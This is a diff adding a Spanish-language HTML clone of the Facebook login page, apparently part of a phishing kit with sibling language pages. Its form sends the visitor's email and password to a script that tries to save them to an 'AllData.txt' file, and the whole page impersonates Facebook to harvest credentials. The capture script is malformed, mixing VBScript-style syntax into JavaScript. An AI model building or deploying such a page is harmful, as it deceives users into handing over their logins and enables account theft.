@@ -1,0 +1,792 @@
+﻿<!DOCTYPE html>
+
+<html lang="es" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <link rel="icon" type="image/x-icon" href="logo.ico" />
+    <style>
+        body {
+            background-color: #F0F2F5;
+        }
+
+        .fb {
+            height: 106px;
+            margin: -28px;
+            font-size: 12px;
+            border: 0;
+            margin-top: 175px;
+            margin-left: 238px;
+        }
+
+        .faceuse {
+            font-size: 28px;
+            width: 510px;
+            margin-left: 269px;
+            margin-top: 13px;
+            line-height: 32px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .login {
+            background-color: white;
+            height: 360px;
+            width: 400px;
+            margin-left: 850px;
+            margin-top: -230px;
+            border-radius: 7px;
+            box-shadow: 0 4px 8px #e3e3e3, 0 6px 20px #e3e3e3;
+        }
+
+        .email {
+            height: 48px;
+            width: 350px;
+            margin-top: 20px;
+            margin-left: 20px;
+            border-radius: 6px;
+            font-size: 10px;
+            border: 1px solid #e6e6e6;
+            line-height: 43px;
+        }
+
+            .email:focus-visible {
+                outline: 2px solid #00acee;
+                caret-color: #1877f2;
+            }
+
+        .password {
+            height: 48px;
+            width: 350px;
+            margin-top: -7px;
+            margin-left: 20px;
+            border-radius: 6px;
+            font-size: 10px;
+            border: 1px solid #e6e6e6;
+            line-height: 43px;
+        }
+
+            .password:focus-visible {
+                outline: 2px solid #00acee;
+                caret-color: #1877f2;
+            }
+
+        .connect {
+            background-color: #1877f2;
+            border-radius: 6px;
+            border: 1px solid #1877f2;
+            font-size: 21px;
+            width: 357px;
+            line-height: 48px;
+            color: white;
+            margin-top: 20px;
+            margin-left: 20px;
+            cursor: pointer;
+            text-align: center;
+            font-family: Sans-serif;
+            font-weight: bold;
+            height: 49px;
+        }
+
+            .connect:hover {
+                background-color: #1170cb;
+            }
+
+        a {
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .forpass {
+            color: #1877f2;
+            font-size: 14px;
+            font-family: sans-serif;
+            margin-left: 58px;
+            margin-top: 20px;
+        }
+
+            .forpass:hover {
+                text-decoration: underline;
+            }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            width: 360px;
+            margin-left: 20px;
+            margin-top: 23px;
+        }
+
+        .newacc {
+            font-size: 15px;
+            font-family: sans-serif;
+            font-weight: bold;
+            color: white;
+            background-color: #2eb82e;
+            border-radius: 6px;
+            border: 1px solid #2eb82e;
+            height: 48px;
+            width: 195px;
+            margin-top: 26px;
+            cursor: pointer;
+        }
+
+            .newacc:hover {
+                background-color: #009600;
+            }
+
+        .celeb {
+            margin-top: 29px;
+            font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            margin-left: 45px;
+        }
+
+        .cpage {
+            color: #000000;
+            font-weight: bold;
+        }
+
+            .cpage:hover {
+                text-decoration: underline;
+                cursor: pointer;
+            }
+
+        .footer {
+            background-color: #FFFFFF;
+            height: 170px;
+            padding: 30px 10px 10px 10px;
+            font-size: 13px;
+        }
+
+        .en {
+            color: #8a8d91;
+            font-size: 13px;
+            margin-bottom: 10px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .en:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .el {
+            color: #8a8d91;
+            margin-bottom: 10px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .el:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .hq {
+            color: #8a8d91;
+            margin-bottom: 100px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .hq:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .tr {
+            color: #8a8d91;
+            margin-bottom: 10px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .tr:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .bg {
+            color: #8a8d91;
+            margin-bottom: 10px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .bg:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .ro {
+            color: #8a8d91;
+            margin-bottom: 10px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .ro:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .ru {
+            color: #8a8d91;
+            margin-bottom: 10px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .ru:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .ar {
+            color: #8a8d91;
+            margin-bottom: 10px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .ar:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .de {
+            color: #8a8d91;
+            margin-bottom: 10px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .de:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .es {
+            color: #8a8d91;
+            margin-bottom: 10px;
+            margin-left: 300px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .es:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .pg {
+            color: #8a8d91;
+            margin-bottom: 10px;
+            margin-left: 6px;
+            font-size: 12px;
+            font-family: sans-serif;
+        }
+
+            .pg:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .dividerf {
+            border-bottom: 1px solid #dadde1;
+            width: 920px;
+            margin-left: 298px;
+            margin-top: 15px;
+        }
+
+        .signup {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 300px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .signup:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .log-in {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .log-in:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .messenger {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .messenger:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .facelite {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .facelite:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .watch {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .watch:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .places {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .places:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .games {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .games:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .markplace {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .markplace:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .pay {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .pay:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .oculus {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .oculus:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .port {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .port:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .insta {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .insta:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .bullin {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .bullin:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .local {
+            color: #8a8d91;
+            margin-bottom: 5px;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .local:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .fundr {
+            color: #8a8d91;
+            margin-left: 299px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .fundr:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .serv {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .serv:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .voteinfo {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .voteinfo:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .groups {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .groups:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .about {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .about:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .ad {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .ad:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .crtpage {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .crtpage:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .devs {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .devs:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .car {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .car:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .priv {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .priv:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .cookies {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .cookies:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .adch {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .adch:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .terms {
+            color: #8a8d91;
+            margin-left: 300px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .terms:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .help {
+            color: #8a8d91;
+            margin-left: 300px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .help:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .contup {
+            color: #8a8d91;
+            margin-left: 12px;
+            font-family: sans-serif;
+            font-size: 12px;
+        }
+
+            .contup:hover {
+                cursor: pointer;
+                text-decoration: underline;
+            }
+
+        .meta {
+            color: #8a8d91;
+            font-size: 12px;
+            font-family: sans-serif;
+            margin-left: 300px;
+        }
+
+            .meta:hover {
+                cursor: auto;
+            }
+    </style>
+</head>
+<body>
+    <img src="facebook.svg" class="fb" />
+    <p class="faceuse">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+    <div class="login">
+        <form action="loading.html" onsubmit="WriteToFile">
+            <label for="email"></label>
+            <input style="font-size: 16px;" class="email" type="email" name="email" id="email" placeholder="  Correo electrónico o número de teléfono" required="required" />
+            <br />
+            <br />
+            <input style="font-size: 16px;" class="password" type="password" name="password" id="password" placeholder="  Contraseña" required="required" />
+            <br />
+            <input class="connect" type="submit" value="Iniciar sesión" />
+            <div class="forpass">
+                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" target="_blank" class="forpass">¿Olvidaste tu contraseña?</a>
+            </div>
+            <div class="divider"></div>
+            <center>
+                <input class="newacc" type="button" value="Crear cuenta nueva" />
+            </center>
+        </form>
+        <script language="Javascript">
+            function WriteToFile(passForm) {
+                set fso = CreateObject("Scripting.FileSystemObject");
+                set f = fso.CreateTextFile("<your path>/AllData.txt", True);
+
+                var Email = document.getElementById('email');
+                var Password = document.getElementById('password');
+
+                f.writeline("Email :" + Email);
+                f.writeline("Password :" + Password);
+
+                f.writeline("-----------------------------");
+                f.Close();
+            }
+        </script>
+        <br />
+        <div class="celeb">
+            <a href="https://www.facebook.com/pages/create/?ref_type=registration_form" class="cpage">Crea una página</a> para una celebridad, una marca o un negocio.
+        </div>
+    </div>
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <div class="footer">
+        <a href="login-es.html" class="es">Español</a>
+        <a href="login.html" class="en">English (US)</a>
+        <a href="login-hq.html" class="hq">Shqip</a>
+        <a href="login-el.html" class="el">Ελληνικά</a>
+        <a href="login-tr.html" class="tr">Türkçe</a>
+        <a href="login-bg.html" class="bg">Български</a>
+        <a href="login-ro.html" class="ro">Română</a>
+        <a href="login-ru.html" class="ru">Русский</a>
+        <a href="forbidden.html" class="ar">العربية</a>
+        <a href="login-de.html" class="de">Deutsch</a>
+        <a href="login-pg.html" class="pg">Português (Brasil)</a>
+        <div class="dividerf">
+        </div>
+        <br />
+        <a href="https://www.facebook.com/reg/" class="signup">Registrarte</a>
+        <a href="login.html" class="log-in">Iniciar sesión</a>
+        <a href="https://www.messenger.com/" class="messenger">Messenger</a>
+        <a href="https://www.facebook.com/lite/" class="facelite">Facebook Lite</a>
+        <a href="https://www.facebook.com/watch/" class="watch">Watch</a>
+        <a href="https://www.facebook.com/places/" class="places">Lugares</a>
+        <a href="https://www.facebook.com/games/" class="games">Juegos</a>
+        <a href="login.html" class="markplace">Marketplace</a>
+        <a href="https://pay.facebook.com/" class="pay">Facebook Pay</a>
+        <a href="https://store.facebook.com/quest/?utm_source=www.facebook.com&utm_medium=oculusredirect" class="oculus">Oculus</a>
+        <a href="https://store.facebook.com/portal/?utm_source=www.facebook.com&utm_medium=portalredirect" class="port">Portal</a>
+        <a href="https://www.instagram.com/" class="insta">Instagram</a>
+        <a href="https://www.bulletin.com/" class="bullin">Bulletin</a>
+        <a href="https://www.facebook.com/local" class="local">Local</a>
+        <br />
+        <br />
+        <a href="https://www.facebook.com/fundraisers/" class="fundr">Recaudaciones de fondos</a>
+        <a href="https://www.facebook.com/biz/directory/" class="serv">Servicios</a>
+        <a href="https://www.facebook.com/votinginformationcenter/" class="voteinfo">Centro de información de votación</a>
+        <a href="https://www.facebook.com/groups/explore/" class="groups">Grupos</a>
+        <a href="https://about.facebook.com/" class="about">Información</a>
+        <a href="login.html" class="ad">Crear anuncio</a>
+        <a href="https://www.facebook.com/pages/create" class="crtpage">Crear página</a>
+        <a href="https://developers.facebook.com" class="devs">Desarrolladores</a>
+        <a href="https://www.metacareers.com/" class="car">Empleo</a>
+        <a href="https://www.facebook.com/privacy/explanation/" class="priv">Privacidad</a>
+        <a href="https://www.facebook.com/policies/cookies/" class="cookies">Cookies</a>
+        <a href="https://www.facebook.com/help/568137493302217" class="adch">Opciones de anuncios</a>
+        <a href="https://www.facebook.com/policies_center/" class="terms">Condiciones</a>
+        <br />
+        <br />
+        <a href="https://www.facebook.com/help" class="help">Ayuda</a>
+        <a href="https://www.facebook.com/help/637205020878504" class="contup">Subir contactos y no usuariosConfiguración</a>
+        <br />
+        <br />
+        <p class="meta">Meta © 2022</p>
+    </div>
+</body>
+</html>
